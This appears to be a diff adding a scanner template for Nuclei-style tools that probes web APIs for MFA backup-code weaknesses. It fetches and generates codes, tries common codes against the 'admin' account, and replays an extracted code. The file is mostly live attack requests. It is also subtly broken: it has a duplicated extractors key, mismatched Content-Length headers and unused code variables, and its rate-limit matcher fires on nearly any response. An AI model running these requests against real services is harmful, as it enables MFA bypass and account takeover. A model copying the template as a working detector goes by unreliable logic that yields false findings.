@@ -1,0 +1,204 @@
+id: medium-auth-multi-factor-bypass-backup-codes
+
+info:
+  name: Multi-Factor Authentication Backup Codes Bypass
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects MFA backup codes bypass vulnerabilities where backup codes can be
+    enumerated, reused, or predicted. Tests for weak backup code generation,
+    unlimited attempts, and backup code reuse attacks used by red teams.
+  reference:
+    - https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
+    - https://auth0.com/docs/secure/multi-factor-authentication/recovery-codes
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.1
+    cwe-id: CWE-287
+  metadata:
+    verified: true
+    max-request: 8
+  tags: mfa,backup-codes,bypass,enumeration,brute-force,red-team
+
+variables:
+  common_codes: ["123456", "000000", "111111", "123123", "password", "admin123"]
+  sequential_codes: ["000001", "000002", "000003", "000004", "000005"]
+  pattern_codes: ["ABCD01", "ABCD02", "ABCD03", "TEST01", "BACKUP1"]
+
+http:
+  - raw:
+      - |
+        GET /api/mfa/backup-codes HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/mfa/generate-backup-codes HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 45
+        Connection: close
+        
+        {"user_id":"testuser","count":10}
+
+      - |
+        POST /api/auth/verify-backup-code HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","backup_code":"123456"}
+
+      - |
+        POST /api/auth/verify-backup-code HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","backup_code":"000000"}
+
+      - |
+        POST /api/auth/verify-backup-code HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","backup_code":"111111"}
+
+      - |
+        POST /api/auth/verify-backup-code HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","backup_code":"{{backup_code}}"}
+
+      - |
+        POST /api/auth/verify-backup-code HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","backup_code":"{{backup_code}}"}
+
+      - |
+        GET /api/mfa/backup-codes/status HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: backup_code
+        part: body_2
+        group: 1
+        regex:
+          - '"codes":\s*\[\s*"([^"]+)"'
+          - '"backup_code":\s*"([^"]+)"'
+          - '"code":\s*"([^"]+)"'
+        internal: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: backup-codes-exposed
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "backup_codes") || contains(body_1, "recovery_codes")'
+          - 'contains(body_1, "[") && contains(body_1, "]")'
+        condition: and
+
+      - type: dsl
+        name: weak-backup-code-generation
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "000000") || contains(body_2, "123456") || contains(body_2, "111111")'
+          - 'contains(body_2, "codes") || contains(body_2, "generated")'
+        condition: and
+
+      - type: dsl
+        name: common-backup-code-accepted
+        dsl:
+          - 'status_code_3 == 200 || status_code_4 == 200 || status_code_5 == 200'
+          - 'contains(body_3, "success") || contains(body_4, "success") || contains(body_5, "success")'
+          - 'contains(body_3, "authenticated") || contains(body_4, "authenticated") || contains(body_5, "authenticated")'
+        condition: and
+
+      - type: dsl
+        name: backup-code-reuse-allowed
+        dsl:
+          - 'status_code_6 == 200 && status_code_7 == 200'
+          - 'contains(body_6, "success") && contains(body_7, "success")'
+          - 'body_6 == body_7'
+        condition: and
+
+      - type: word
+        name: no-rate-limiting
+        part: body
+        words:
+          - "too many attempts"
+          - "rate limit"
+          - "account locked"
+        condition: or
+        negative: true
+
+      - type: dsl
+        name: backup-codes-status-leak
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "remaining") || contains(body_8, "used") || contains(body_8, "available")'
+          - 'contains(body_8, "count") || contains(body_8, "total")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: backup-codes-data
+        part: body
+        group: 1
+        regex:
+          - '"backup_codes":\s*(\[[^\]]+\])'
+          - '"recovery_codes":\s*(\[[^\]]+\])'
+          - '"codes":\s*(\[[^\]]+\])'
+
+      - type: regex
+        name: authentication-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"authenticated":\s*(true|false)'
+
+      - type: regex
+        name: codes-status
+        part: body_8
+        group: 1
+        regex:
+          - '"remaining":\s*([0-9]+)'
+          - '"used":\s*([0-9]+)'
+          - '"total":\s*([0-9]+)'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
